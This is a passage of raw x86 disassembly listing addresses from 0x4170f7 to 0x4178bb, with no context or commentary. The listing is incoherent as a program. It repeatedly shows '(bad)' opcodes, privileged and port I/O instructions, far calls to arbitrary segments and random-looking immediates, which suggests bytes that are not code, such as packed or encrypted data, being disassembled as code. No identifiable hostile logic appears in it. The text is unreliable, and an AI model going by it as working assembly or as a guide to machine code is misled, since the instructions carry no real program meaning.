  4170f7:	xchg   ecx,eax
  4170f8:	adc    ah,BYTE PTR [ebx+0x3d377d0e]
  4170fe:	je     0x417163
  417100:	test   al,0x9a
  417102:	scas   al,BYTE PTR es:[edi]
  417103:	push   esp
  417104:	xchg   edi,eax
  417105:	or     al,0xd8
  417107:	pop    edx
  417108:	sbb    ecx,ebx
  41710a:	scas   eax,DWORD PTR es:[edi]
  41710b:	sahf   
  41710c:	mov    al,ds:0x663b85d5
  417111:	cs pop eax
  417113:	xor    esp,edi
  417115:	pop    esp
  417116:	call   0xd9d:0xe66f144c
  41711d:	pop    ds
  41711e:	into   
  41711f:	loopne 0x4170f4
  417121:	out    dx,al
  417122:	xor    ch,0x82
  417125:	std    
  417126:	lds    edi,FWORD PTR [ecx+esi*2]
  417129:	adc    DWORD PTR [eax+edi*2-0x5a],ecx
  41712d:	je     0x417172
  41712f:	cdq    
  417130:	fisttp DWORD PTR [ebp+0x0]
  417133:	adc    esi,ebx
  417135:	in     al,dx
  417136:	push   es
  417137:	out    0x4b,al
  417139:	adc    DWORD PTR [ebx+0x2aaf45ff],0xffffffcd
  417140:	sbb    al,0x18
  417142:	mov    bh,0x13
  417144:	rdmsr  
  417146:	not    esp
  417148:	sti    
  417149:	jle    0x41710a
  41714b:	inc    ecx
  41714c:	mov    esp,0x6553317
  417151:	std    
  417152:	cmp    al,0xf7
  417154:	mov    ebx,edx
  417156:	test   eax,0xaee4dcbc
  41715b:	fwait
  41715c:	dec    eax
  41715d:	call   0x3ae2:0xbda83c9f
  417164:	and    bl,BYTE PTR [edi]
  417166:	adc    al,0x43
  417168:	pop    ebp
  417169:	sub    edi,DWORD PTR ds:0xb4a23f9d
  41716f:	or     ecx,DWORD PTR [eax]
  417171:	cdq    
  417172:	iret   
  417173:	(bad)  
  417174:	push   ecx
  417175:	aas    
  417176:	mov    ss,WORD PTR [edi-0xc]
  417179:	sub    edx,DWORD PTR [ebx+0x37]
  41717c:	shr    DWORD PTR [ebx-0x3c],0xea
  417180:	call   0xc7ad6dab
  417185:	sub    DWORD PTR [eax],ebx
  417187:	cld    
  417188:	int3   
  417189:	std    
  41718a:	inc    edi
  41718b:	jge    0x417182
  41718d:	jmp    0xd28f:0xaa4401b7
  417194:	push   edx
  417195:	lds    edx,FWORD PTR [esp+eax*1-0x6f]
  417199:	mov    cl,0xe1
  41719b:	add    BYTE PTR [ebx],bh
  41719d:	lods   al,BYTE PTR ds:[esi]
  41719e:	rol    BYTE PTR [esi+0x5a],cl
  4171a1:	repnz out dx,al
  4171a3:	adc    eax,0x8261c476
  4171a8:	push   0xeb035a3b
  4171ad:	push   edx
  4171ae:	icebp  
  4171af:	outs   dx,DWORD PTR ds:[esi]
  4171b0:	push   edx
  4171b1:	mov    bh,0xe2
  4171b3:	pop    ds
  4171b4:	add    BYTE PTR [ebx-0x5a777584],ah
  4171ba:	sub    esp,esi
  4171bc:	imul   esp,DWORD PTR [ebp+0xf],0xdea6995d
  4171c3:	dec    esi
  4171c4:	xor    DWORD PTR [edi],esp
  4171c6:	(bad)  
  4171c7:	adc    eax,0xf8e10b28
  4171cc:	mov    ds,WORD PTR [eax]
  4171ce:	push   edi
  4171cf:	jo     0x4171af
  4171d1:	clc    
  4171d2:	leave  
  4171d3:	call   0xae84:0x40bf33f5
  4171da:	call   0xc8947a4c
  4171df:	and    BYTE PTR gs:[esi-0x14b554f7],bl
  4171e6:	test   eax,0x13a6092b
  4171eb:	fild   WORD PTR [edi+0x25]
  4171ee:	aam    0x64
  4171f0:	adc    al,0xe2
  4171f2:	outs   dx,BYTE PTR ds:[esi]
  4171f3:	test   DWORD PTR [ecx+0x2c964c71],edi
  4171f9:	fistp  DWORD PTR [ecx]
  4171fb:	cwde   
  4171fc:	and    BYTE PTR [edi],0x98
  4171ff:	ins    DWORD PTR es:[edi],dx
  417200:	sub    edx,edx
  417202:	rcr    esp,cl
  417204:	shl    BYTE PTR [ebp-0x2452c10],cl
  41720a:	rcr    DWORD PTR [edi+0x63ae3e08],cl
  417210:	idiv   DWORD PTR [ecx+0x34]
  417213:	jo     0x41723c
  417215:	xor    esi,ebp
  417217:	stos   BYTE PTR es:[edi],al
  417218:	cmp    BYTE PTR [ebx-0x80],al
  41721b:	(bad)  
  41721c:	cli    
  41721d:	test   BYTE PTR [ebp+0x3d7bb3da],ah
  417223:	xchg   edx,eax
  417224:	pcmpeqb mm5,QWORD PTR [esp+eiz*2+0x27]
  417229:	and    eax,0x58144954
  41722e:	push   0x4d71679e
  417233:	fnstsw WORD PTR [eax]
  417235:	jp     0x417264
  417237:	push   ecx
  417238:	retf   0xae4d
  41723b:	and    DWORD PTR [ebx+0x3e],ebp
  41723e:	cmp    ebp,edx
  417240:	je     0x41722e
  417242:	ins    DWORD PTR es:[edi],dx
  417243:	add    DWORD PTR [esi-0x28],ecx
  417246:	push   ebp
  417247:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417248:	mov    ebx,0x65b0d40f
  41724d:	mov    ds:0x534cf622,eax
  417252:	sbb    eax,0xbc7259fd
  417257:	pop    esi
  417258:	xor    DWORD PTR [edi],0xfffffff8
  41725b:	cmp    cl,BYTE PTR [ecx-0x36ec5e45]
  417261:	cmp    al,0x40
  417263:	les    ebx,FWORD PTR [edi+ecx*1+0x44]
  417267:	dec    edi
  417268:	pop    esi
  417269:	sbb    al,0x11
  41726b:	call   0x301b:0x8bbd0126
  417272:	sub    esi,DWORD PTR [ebx-0x4a424dc9]
  417278:	call   0xb4f9:0xdc72f08f
  41727f:	lahf   
  417280:	sub    esp,ebx
  417282:	scas   al,BYTE PTR es:[edi]
  417283:	hlt    
  417284:	inc    ecx
  417285:	pop    ds
  417286:	test   BYTE PTR [esi+0x7e],cl
  417289:	call   0x2e69d0d7
  41728e:	and    ebp,eax
  417290:	call   0x43fe8890
  417295:	or     ebp,ebp
  417297:	jge    0x417280
  417299:	jnp    0x4172cd
  41729b:	(bad)  
  41729c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41729d:	stc    
  41729e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41729f:	xor    BYTE PTR [eax-0x75],al
  4172a2:	stos   BYTE PTR es:[di],al
  4172a4:	pop    ebp
  4172a5:	loope  0x4172e9
  4172a7:	adc    ebp,DWORD PTR [edi+ebx*8+0x51c46900]
  4172ae:	adc    al,0xe0
  4172b0:	xor    esi,DWORD PTR [ecx+0x26db70d6]
  4172b6:	xor    al,0x25
  4172b8:	jnp    0x4172fd
  4172ba:	xchg   edi,eax
  4172bb:	sub    dh,BYTE PTR [esi]
  4172bd:	dec    ecx
  4172be:	cmp    ebp,DWORD PTR [edi]
  4172c0:	(bad)  
  4172c1:	jmp    0x653a:0x46f26176
  4172c8:	and    BYTE PTR [ebp-0x31],0xa0
  4172cc:	jmp    0x5a25:0x427dae28
  4172d3:	stos   BYTE PTR es:[edi],al
  4172d4:	pushf  
  4172d5:	scas   eax,DWORD PTR es:[edi]
  4172d6:	inc    edx
  4172d7:	push   ds
  4172d8:	mov    eax,0xde2c5199
  4172dd:	sbb    esp,ebp
  4172df:	mov    edi,0x46f1eb89
  4172e4:	jle    0x41732a
  4172e6:	push   0x7d
  4172e8:	(bad)  
  4172e9:	push   ds
  4172ea:	ins    DWORD PTR es:[di],dx
  4172ec:	loope  0x41730e
  4172ee:	push   cs
  4172ef:	sti    
  4172f0:	(bad)  
  4172f1:	adc    al,0x2d
  4172f3:	sbb    BYTE PTR [edi],0x3f
  4172f6:	(bad)  
  4172f7:	std    
  4172f8:	mov    ds:0x4d5b0431,al
  4172fd:	cdq    
  4172fe:	sti    
  4172ff:	jns    0x417293
  417301:	jns    0x41730f
  417303:	dec    eax
  417304:	test   eax,0xac87344d
  417309:	xor    al,0x61
  41730b:	out    dx,eax
  41730c:	loope  0x41737d
  41730e:	pop    es
  41730f:	jle    0x41738a
  417311:	aam    0x90
  417313:	loope  0x417306
  417315:	outs   dx,DWORD PTR ds:[esi]
  417316:	cmp    ah,bl
  417318:	sbb    BYTE PTR [ebx-0x1109ac8b],0x56
  41731f:	int3   
  417320:	pop    ebp
  417321:	dec    esi
  417322:	xor    bh,BYTE PTR [edi]
  417324:	pop    ds
  417325:	ficomp DWORD PTR [esi]
  417327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417328:	and    BYTE PTR [edi],bh
  41732a:	push   esi
  41732b:	cdq    
  41732c:	inc    ecx
  41732d:	nop
  41732e:	data16 xor BYTE PTR [esi],ch
  417331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417332:	xchg   esp,eax
  417333:	imul   esp,DWORD PTR [edx+0xda3419],0xffffff86
  41733a:	mov    BYTE PTR [ebp-0x49],cl
  41733d:	in     eax,0x49
  41733f:	push   0x67bb2edd
  417344:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417345:	in     eax,dx
  417346:	cli    
  417347:	sbb    DWORD PTR [edi-0x50],eax
  41734a:	mov    ebp,0x7d8536e0
  41734f:	push   esp
  417350:	pop    ebp
  417351:	jbe    0x4172f4
  417353:	and    BYTE PTR [esi],al
  417355:	adc    dh,BYTE PTR [edx]
  417357:	or     al,0x6a
  417359:	test   edx,0xf424d9ff
  41735f:	dec    edx
  417360:	jp     0x4172e5
  417362:	lahf   
  417363:	into   
  417364:	fst    QWORD PTR [ecx]
  417366:	jecxz  0x41732e
  417368:	pop    ss
  417369:	or     eax,ebp
  41736b:	pop    esi
  41736c:	nop
  41736d:	scas   al,BYTE PTR es:[edi]
  41736e:	rol    dh,cl
  417370:	(bad)  
  417371:	jmp    0x417363
  417373:	clc    
  417374:	stos   BYTE PTR es:[edi],al
  417375:	xchg   edi,eax
  417376:	or     DWORD PTR [edi+ebp*4],edx
  417379:	adc    edx,DWORD PTR [edx+0x53c07091]
  41737f:	mov    ds:0x1d794cec,al
  417384:	push   esi
  417385:	inc    esi
  417386:	ficom  DWORD PTR [edi-0x719894d]
  41738c:	imul   eax,DWORD PTR [edx+eiz*8],0x30
  417390:	call   0x1ae4:0xe4a9f2ec
  417397:	dec    eax
  417398:	pop    ecx
  417399:	test   bh,cl
  41739b:	cmp    BYTE PTR [ebx],cl
  41739d:	xor    dh,BYTE PTR [eax+0x2d]
  4173a0:	scas   eax,DWORD PTR es:[edi]
  4173a1:	out    0xcb,al
  4173a3:	bound  edi,QWORD PTR ds:0x2a8eefd8
  4173a9:	loopne 0x417419
  4173ab:	mov    cl,0x4a
  4173ad:	sbb    cl,BYTE PTR [ecx]
  4173af:	ja     0x417361
  4173b1:	mov    edi,0xc8d51d84
  4173b6:	in     al,dx
  4173b7:	into   
  4173b8:	cs sub eax,0x9e9acb3a
  4173be:	inc    ebp
  4173bf:	stos   DWORD PTR es:[edi],eax
  4173c0:	mov    ?,WORD PTR [ebx]
  4173c2:	mov    cl,0x3
  4173c4:	lods   al,BYTE PTR ds:[esi]
  4173c5:	cdq    
  4173c6:	data16 out dx,al
  4173c8:	sub    BYTE PTR [ecx+0x2b],ch
  4173cb:	outs   dx,BYTE PTR ds:[esi]
  4173cc:	out    0x88,al
  4173ce:	cld    
  4173cf:	jnp    0x41743d
  4173d1:	adc    al,0xb1
  4173d3:	jmp    0xe997687a
  4173d8:	xchg   esi,eax
  4173d9:	sahf   
  4173da:	cmp    esi,edx
  4173dc:	jmp    0x4d3c:0x96179e60
  4173e3:	shl    DWORD PTR [edx+0x122af50f],0xe
  4173ea:	sbb    DWORD PTR [esi+0x60],0x7b
  4173ee:	test   al,0x71
  4173f0:	cdq    
  4173f1:	das    
  4173f2:	jecxz  0x417435
  4173f4:	inc    ecx
  4173f5:	aad    0xfc
  4173f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173f8:	ret    
  4173f9:	mov    BYTE PTR ds:[ebx-0x2c6fb52f],0x71
  417401:	ja     0x41747d
  417403:	rcr    BYTE PTR [ebx-0x47],1
  417406:	cld    
  417407:	cmp    al,0x20
  417409:	aam    0x6a
  41740b:	xchg   esp,eax
  41740c:	nop
  41740d:	cli    
  41740e:	xchg   ch,ah
  417410:	pop    ds
  417411:	sub    BYTE PTR [esi+0x214fe19b],ch
  417417:	and    ah,BYTE PTR [edx]
  417419:	cmp    eax,0xf2d81a72
  41741e:	fimul  DWORD PTR ds:0xe4cf2ffb
  417424:	cs jecxz 0x41743d
  417427:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417428:	push   edi
  417429:	in     eax,dx
  41742a:	mov    al,0x79
  41742c:	es jne 0x417422
  41742f:	and    BYTE PTR fs:0xa6969484,cl
  417436:	pop    ebp
  417437:	fild   WORD PTR [ecx]
  417439:	push   0xb35c6e2f
  41743e:	xor    eax,0x555b0af9
  417443:	mov    gs,WORD PTR [edx+0x3537a488]
  417449:	mov    eax,0xbe0d3c38
  41744e:	jns    0x417470
  417450:	push   edx
  417451:	mov    ebp,0x363abe1b
  417456:	or     al,0xfe
  417458:	and    DWORD PTR [esi+0x42],eax
  41745b:	jl     0x417459
  41745d:	(bad)  
  41745e:	out    dx,al
  41745f:	mov    al,ds:0x8b2aa837
  417464:	jge    0x4174db
  417466:	and    esi,DWORD PTR [esi+esi*2+0x2f]
  41746a:	pop    ecx
  41746b:	xor    edx,DWORD PTR [ebp+0x7af21d81]
  417471:	in     al,0xf7
  417473:	pop    ecx
  417474:	dec    ecx
  417475:	mov    dl,0x96
  417477:	pop    edi
  417478:	xchg   edx,eax
  417479:	aaa    
  41747a:	stos   DWORD PTR es:[edi],eax
  41747b:	dec    esp
  41747c:	sahf   
  41747d:	pop    edx
  41747e:	mov    bh,BYTE PTR [esi+0x7a6a2b06]
  417484:	nop
  417485:	shl    bl,0x63
  417488:	and    ah,BYTE PTR [edx]
  41748a:	cld    
  41748b:	iret   
  41748c:	in     eax,0x72
  41748e:	mov    ah,0x71
  417490:	(bad)  
  417491:	jb     0x4174e2
  417493:	xor    DWORD PTR [eax+0x14],esp
  417496:	push   ebx
  417497:	xor    al,cl
  417499:	mov    dl,0x3f
  41749b:	adc    eax,0xc315e4e4
  4174a0:	adc    DWORD PTR [ecx-0x5b3ffc61],0x40c69f42
  4174aa:	hlt    
  4174ab:	dec    ecx
  4174ac:	mov    edi,0xd7956413
  4174b1:	retf   0x479c
  4174b4:	adc    BYTE PTR [eax-0x6f],ah
  4174b7:	and    al,0xb0
  4174b9:	push   ebp
  4174ba:	icebp  
  4174bb:	out    dx,al
  4174bc:	outs   dx,BYTE PTR ds:[esi]
  4174bd:	(bad)  
  4174be:	push   eax
  4174bf:	mov    BYTE PTR [ebp+0x2079a354],dl
  4174c5:	push   eax
  4174c6:	fiadd  DWORD PTR [edx-0x1dfa579]
  4174cc:	and    al,0x7c
  4174ce:	mov    al,ds:0xc3938a3d
  4174d3:	jno    0x417522
  4174d5:	shr    DWORD PTR [eax],0x2b
  4174d8:	pop    eax
  4174d9:	aam    0x98
  4174db:	sub    al,0xbe
  4174dd:	cwde   
  4174de:	dec    edx
  4174df:	imul   esi,DWORD PTR [esi],0x5ada4177
  4174e5:	xchg   ebx,eax
  4174e6:	hlt    
  4174e7:	or     DWORD PTR [edi+0x5094f61a],esp
  4174ed:	sbb    DWORD PTR [eax],ecx
  4174ef:	adc    eax,0xe4014a5e
  4174f4:	stos   BYTE PTR es:[edi],al
  4174f5:	mov    BYTE PTR ds:0xba0e3ce2,bh
  4174fb:	add    BYTE PTR [edi+edi*2],ch
  4174fe:	pop    ebp
  4174ff:	daa    
  417500:	push   es
  417501:	rcl    edi,cl
  417503:	push   DWORD PTR [ecx+0x6e]
  417506:	je     0x41748b
  417508:	and    ch,BYTE PTR [ebp-0x1aff654e]
  41750e:	popf   
  41750f:	xor    ebx,esp
  417511:	scas   eax,DWORD PTR es:[edi]
  417512:	push   ss
  417513:	mov    ebp,0xf6b2e014
  417518:	jg     0x4174de
  41751a:	push   ebx
  41751b:	push   ebx
  41751c:	cli    
  41751d:	je     0x417580
  41751f:	mov    WORD PTR [edx+eiz*4],cs
  417522:	mov    dh,0xf7
  417524:	push   edx
  417525:	fcom   st(6)
  417527:	aaa    
  417528:	mov    WORD PTR ds:[ebx+0x4f6f49c8],?
  41752f:	xchg   DWORD PTR [edx+0x59],esp
  417532:	sbb    eax,0xb2960541
  417537:	or     dl,ah
  417539:	sub    eax,0x799c2a5f
  41753e:	outs   dx,DWORD PTR ds:[esi]
  41753f:	lea    ecx,fs:[esi+0x41154704]
  417546:	inc    edi
  417547:	and    cl,BYTE PTR [esi+0x18]
  41754a:	test   BYTE PTR [ebp+0x5],ah
  41754d:	fcom   QWORD PTR [ebp-0x9]
  417550:	xor    esi,DWORD PTR [eax]
  417552:	fiadd  WORD PTR [ebx-0x70]
  417555:	dec    ecx
  417556:	inc    eax
  417557:	adc    DWORD PTR [ebx+0x1bf35617],ebp
  41755d:	push   esi
  41755e:	js     0x4175dc
  417560:	jo     0x4174ef
  417562:	sar    DWORD PTR [edi],1
  417564:	clc    
  417565:	xchg   ebx,eax
  417566:	jb     0x4175c1
  417568:	mov    esp,0xae54bc7c
  41756d:	test   dl,0xc
  417570:	xchg   BYTE PTR [edx+0x7],dh
  417573:	imul   edx,esp,0x21
  417576:	jp     0x4175ab
  417578:	in     eax,dx
  417579:	loop   0x41755d
  41757b:	call   0x9ab4:0xf5bff71f
  417582:	push   edi
  417583:	aam    0xaa
  417585:	xor    DWORD PTR [ecx],edi
  417587:	jmp    FWORD PTR [ebx]
  417589:	sbb    BYTE PTR [ebx],al
  41758b:	test   DWORD PTR ds:0x620fa91d,ecx
  417591:	or     DWORD PTR ds:0xa144205d,ebp
  417597:	in     al,dx
  417598:	fndisi(8087 only) 
  41759a:	mov    DWORD PTR [ebp+0x50],ebx
  41759d:	pusha  
  41759e:	pop    ds
  41759f:	aad    0x89
  4175a1:	daa    
  4175a2:	sbb    cl,cl
  4175a4:	add    esi,DWORD PTR [ecx+0x3f]
  4175a7:	arpl   WORD PTR [ebx-0x3db6de3b],si
  4175ad:	push   ebx
  4175ae:	jge    0x417575
  4175b0:	sbb    DWORD PTR ds:0xcdd05f6d,eax
  4175b6:	mov    bl,0x7b
  4175b8:	sub    BYTE PTR [esi+esi*8+0x20c78d5a],bh
  4175bf:	and    al,0xf9
  4175c1:	aam    0x8e
  4175c3:	or     al,0x6
  4175c5:	cwde   
  4175c6:	xchg   edi,eax
  4175c7:	pop    es
  4175c8:	pop    ss
  4175c9:	push   0x5668d5a7
  4175ce:	dec    edx
  4175cf:	rcr    ah,1
  4175d1:	push   ss
  4175d2:	out    0xb0,eax
  4175d4:	ins    DWORD PTR es:[edi],dx
  4175d5:	js     0x4175b0
  4175d7:	push   ecx
  4175d8:	inc    eax
  4175d9:	or     cl,bl
  4175db:	(bad)  
  4175dc:	or     DWORD PTR [edi+esi*8+0x2b],eax
  4175e0:	inc    ebx
  4175e1:	gs or  al,0x83
  4175e4:	enter  0x85d0,0x27
  4175e8:	not    DWORD PTR [ebx]
  4175ea:	dec    ebx
  4175eb:	jnp    0x417602
  4175ed:	ror    bl,cl
  4175ef:	lods   eax,DWORD PTR ds:[esi]
  4175f0:	cmp    bh,bl
  4175f2:	mov    esp,DWORD PTR [edx]
  4175f4:	mov    bl,0xcc
  4175f6:	mov    ebx,0xc4a637ac
  4175fb:	or     al,0xa5
  4175fd:	neg    DWORD PTR [ecx]
  4175ff:	add    al,0x5e
  417601:	cli    
  417602:	data16 fld QWORD PTR [eax*1+0x43095d6b]
  41760a:	and    dh,bl
  41760c:	call   0x165f:0x14e7cfa
  417613:	loopne 0x41768f
  417615:	jbe    0x4175cc
  417617:	or     dh,BYTE PTR [ecx-0x2c327f15]
  41761d:	xor    ecx,ebp
  41761f:	aas    
  417620:	jp     0x4175ec
  417622:	mov    dh,0x7b
  417624:	mov    eax,DWORD PTR [edi]
  417626:	js     0x41760e
  417628:	sahf   
  417629:	int    0x2f
  41762b:	add    al,0xed
  41762d:	lock in al,0xe3
  417630:	scas   eax,DWORD PTR es:[edi]
  417631:	dec    ebp
  417632:	lods   al,BYTE PTR ds:[esi]
  417633:	xor    ah,BYTE PTR [esi]
  417635:	sbb    dh,bh
  417637:	pop    edi
  417638:	mov    esi,0x3ad6b6d9
  41763d:	pop    edi
  41763e:	cmc    
  41763f:	mov    dl,0x87
  417641:	ffreep st(4)
  417643:	pop    eax
  417644:	jmp    0x5e47:0x4b908a9b
  41764b:	outs   dx,BYTE PTR ds:[esi]
  41764c:	div    BYTE PTR [ebx-0x67282ed9]
  417652:	jb     0x417603
  417654:	outs   dx,DWORD PTR ds:[esi]
  417655:	imul   BYTE PTR [ebp+0x33ccb934]
  41765b:	xor    al,0x67
  41765d:	mov    edi,0xa3b80935
  417662:	arpl   WORD PTR [edx+0x4c],si
  417665:	mov    al,ds:0x62096262
  41766a:	xchg   BYTE PTR [eax+0x4e137d3c],al
  417670:	daa    
  417671:	test   cl,ah
  417673:	adc    cl,BYTE PTR [ebx-0x2b]
  417676:	ins    BYTE PTR es:[edi],dx
  417677:	out    dx,eax
  417678:	retf   0x6bd8
  41767b:	jb     0x4176fb
  41767d:	xchg   BYTE PTR [eax-0x29e050c2],bl
  417683:	mov    DWORD PTR [ecx],ecx
  417685:	inc    ebp
  417686:	int    0x55
  417688:	imul   ecx,DWORD PTR [esi-0x67b8aefb],0x1f
  41768f:	dec    ebx
  417690:	jl     0x41769b
  417692:	adc    al,0x80
  417695:	cdq    
  417696:	dec    edx
  417697:	jne    0x4176d2
  417699:	mov    edx,0x9ab89b06
  41769e:	xchg   DWORD PTR [edi+0x7e0a305f],ebp
  4176a4:	push   0xcd79ba9f
  4176a9:	call   0x3d94:0x78f74218
  4176b0:	jl     0x417718
  4176b2:	mov    DWORD PTR [edx],0x94eb35e2
  4176b8:	xor    edx,ebx
  4176ba:	sbb    DWORD PTR [eax-0x38de31fa],edx
  4176c0:	push   es
  4176c1:	push   ebx
  4176c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4176c3:	pop    ebp
  4176c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176c5:	mov    ebp,0x605410be
  4176ca:	mov    ebx,0x371b022b
  4176cf:	xor    ch,dl
  4176d1:	and    al,0xc6
  4176d3:	jb     0x41773d
  4176d5:	sbb    ebx,esi
  4176d7:	mov    ebp,0xfb842b53
  4176dc:	pop    ebx
  4176dd:	ror    BYTE PTR [ecx+0x30],1
  4176e0:	add    DWORD PTR [edi-0x75],ebx
  4176e3:	mov    ebx,0x35831f79
  4176e8:	stos   BYTE PTR es:[edi],al
  4176e9:	jl     0x4176bf
  4176eb:	sub    ch,BYTE PTR [eax]
  4176ed:	int    0x70
  4176ef:	cmp    ch,BYTE PTR [ecx+0x2a]
  4176f2:	pusha  
  4176f3:	jne    0x417677
  4176f5:	in     eax,0x7b
  4176f7:	jne    0x4176b8
  4176f9:	mov    ebp,0x8ed48208
  4176fe:	jl     0x4176fb
  417700:	ror    DWORD PTR [edx-0x2915895f],cl
  417706:	and    BYTE PTR [ecx],al
  417708:	fcomp  DWORD PTR [eax-0x6f]
  41770b:	add    esi,edx
  41770d:	stos   DWORD PTR es:[edi],eax
  41770e:	nop
  41770f:	mov    al,0x7a
  417711:	call   0x1c5f:0x9fc83cdc
  417718:	cdq    
  417719:	test   DWORD PTR [ecx+esi*2+0x420a445d],edx
  417720:	(bad)  
  417721:	loopne 0x4176ad
  417723:	std    
  417724:	push   cs
  417725:	repnz fbld TBYTE PTR [ebx]
  417728:	rcr    DWORD PTR [edx],cl
  41772a:	nop
  41772b:	xchg   edi,eax
  41772c:	mov    edi,0xf1609a0b
  417731:	cs (bad) 
  417733:	nop
  417734:	test   ecx,0x30ad30ee
  41773a:	adc    edx,esp
  41773c:	push   ebx
  41773d:	push   ds
  41773e:	xchg   BYTE PTR [eax],ch
  417740:	mov    eax,0x7d91e15c
  417745:	inc    ecx
  417746:	fdivr  DWORD PTR [edi]
  417748:	mov    al,dh
  41774a:	daa    
  41774b:	or     al,0xa4
  41774d:	jbe    0x4177c7
  41774f:	jg     0x41770f
  417751:	(bad)  
  417752:	xor    al,0x94
  417754:	xchg   dh,ah
  417756:	ds loopne 0x4177cc
  417759:	adc    cl,BYTE PTR [ebx-0x22]
  41775c:	sbb    bl,ah
  41775e:	ins    DWORD PTR es:[edi],dx
  41775f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417760:	dec    ebp
  417761:	les    esp,FWORD PTR [ebx]
  417763:	push   ds
  417764:	(bad)  
  417765:	cld    
  417766:	push   edi
  417767:	or     BYTE PTR [eax],bl
  417769:	sub    eax,0x38f52f88
  41776e:	daa    
  41776f:	push   ebx
  417770:	stos   DWORD PTR es:[edi],eax
  417771:	inc    eax
  417772:	adc    eax,esi
  417774:	or     al,0xe5
  417776:	sub    BYTE PTR [ecx],bh
  417778:	fstp   TBYTE PTR [ebx]
  41777a:	stos   BYTE PTR es:[edi],al
  41777b:	add    ecx,DWORD PTR [ebp+edi*8+0x46]
  41777f:	cmp    BYTE PTR [edi+esi*2-0x26641330],bl
  417786:	sbb    al,0xcf
  417788:	inc    ebp
  417789:	data16 jg 0x4177f9
  41778c:	jnp    0x417733
  41778e:	pop    eax
  41778f:	sbb    al,0xa2
  417791:	fisttp QWORD PTR [esi+esi*4+0x43]
  417795:	idiv   DWORD PTR [edx]
  417797:	fs loope 0x4177e4
  41779a:	xchg   DWORD PTR [edi+0x46],edi
  41779d:	xchg   ebp,eax
  41779e:	fwait
  41779f:	mov    ds:0x50c7c3aa,eax
  4177a4:	test   eax,0x1684264d
  4177a9:	jbe    0x4177d5
  4177ab:	push   edx
  4177ac:	in     al,0xed
  4177ae:	aad    0xf3
  4177b0:	pop    ebx
  4177b1:	mov    bl,0x50
  4177b3:	fstp   TBYTE PTR [edi+ecx*4+0x8]
  4177b7:	imul   ecx,DWORD PTR [esi+ebp*1+0x16fdfd78],0x71978b1b
  4177c2:	jnp    0x4177dd
  4177c4:	stos   DWORD PTR es:[edi],eax
  4177c5:	ss jg  0x417827
  4177c8:	out    dx,al
  4177c9:	jp     0x417815
  4177cb:	sbb    eax,0x811d7325
  4177d0:	fdiv   st,st(7)
  4177d2:	repz mov ebx,0x816eab67
  4177d8:	fidivr WORD PTR [eax-0x5970ee18]
  4177de:	adc    bh,dh
  4177e0:	or     ch,BYTE PTR [ebx+0x2d]
  4177e3:	adc    ecx,DWORD PTR [ebx+0x51]
  4177e6:	pop    es
  4177e7:	cmp    al,0xc3
  4177e9:	pop    ebx
  4177ea:	call   0x865:0x16308b9d
  4177f1:	adc    BYTE PTR [edx+0x66f4935f],bl
  4177f7:	xor    BYTE PTR [eax-0x4fdcaa5f],cl
  4177fd:	mov    ds:0x4c3b0de1,eax
  417802:	stc    
  417803:	jmp    0x6fe8:0xaade263c
  41780a:	(bad)  
  41780b:	jbe    0x41783a
  41780d:	jmp    0x41783a
  41780f:	mov    DWORD PTR [esi-0x74],eax
  417812:	add    BYTE PTR [ebx+0x7f],0xcc
  417816:	jae    0x41780b
  417818:	pop    ebp
  417819:	popa   
  41781a:	dec    edi
  41781b:	jno    0x4177bb
  41781d:	repz sahf 
  41781f:	int3   
  417820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417821:	cmp    BYTE PTR [ecx],bl
  417823:	jbe    0x4177d7
  417825:	jmp    0x5239f777
  41782a:	cmp    al,0x84
  41782c:	(bad)  [ecx]
  41782e:	ins    DWORD PTR es:[edi],dx
  41782f:	xchg   ebx,eax
  417830:	gs jbe 0x41785d
  417833:	inc    edi
  417834:	mov    ecx,0x74ce7f4a
  417839:	hlt    
  41783a:	js     0x4177d7
  41783c:	jns    0x417831
  41783e:	imul   esi,DWORD PTR [eax],0x3ca51524
  417844:	nop
  417845:	out    0xe3,al
  417847:	(bad)  
  417848:	hlt    
  417849:	push   0x1bad434a
  41784e:	sbb    al,0x99
  417850:	jmp    0xa0c44d7b
  417855:	dec    ebx
  417856:	inc    edi
  417857:	push   ecx
  417858:	cwde   
  417859:	call   0xcb64:0x3e443dec
  417860:	adc    eax,0xf0b70988
  417865:	pusha  
  417866:	retf   
  417867:	jbe    0x41784a
  417869:	enter  0x74d0,0x13
  41786d:	push   edx
  41786e:	pushf  
  41786f:	daa    
  417870:	in     al,dx
  417871:	fcom   st(1)
  417873:	int3   
  417874:	cmp    ch,0x8b
  417877:	ins    DWORD PTR es:[edi],dx
  417878:	cmp    dh,dl
  41787a:	retf   
  41787b:	xchg   esp,eax
  41787c:	add    al,0xde
  41787e:	jns    0x417802
  417880:	scas   al,BYTE PTR es:[edi]
  417881:	mov    ?,eax
  417883:	xlat   BYTE PTR ds:[ebx]
  417884:	sar    DWORD PTR [eax-0x44],1
  417887:	cdq    
  417888:	stos   BYTE PTR es:[edi],al
  417889:	push   esp
  41788a:	cmp    ebp,DWORD PTR [edx]
  41788c:	add    al,0xa
  41788e:	cwde   
  41788f:	lds    esp,FWORD PTR [eax+0x2f]
  417892:	and    eax,0xac298877
  417897:	cmc    
  417898:	or     BYTE PTR [eax],dl
  41789a:	push   ecx
  41789b:	clc    
  41789c:	xor    ch,BYTE PTR [ebx+edx*8]
  41789f:	adc    BYTE PTR [edi+0x64],bh
  4178a2:	xlat   BYTE PTR ds:[ebx]
  4178a3:	lea    esp,[edi+0x22cbdafa]
  4178a9:	add    BYTE PTR [esi-0x58],0x1f
  4178ad:	mov    ebx,0x713629ca
  4178b2:	sub    ch,BYTE PTR [edi]
  4178b4:	xchg   ecx,eax
  4178b5:	das    
  4178b6:	jbe    0x4178ae
  4178b8:	dec    eax
  4178b9:	sar    BYTE PTR [edi],1
  4178bb:	xor    ecx,DWORD PTR [edi]
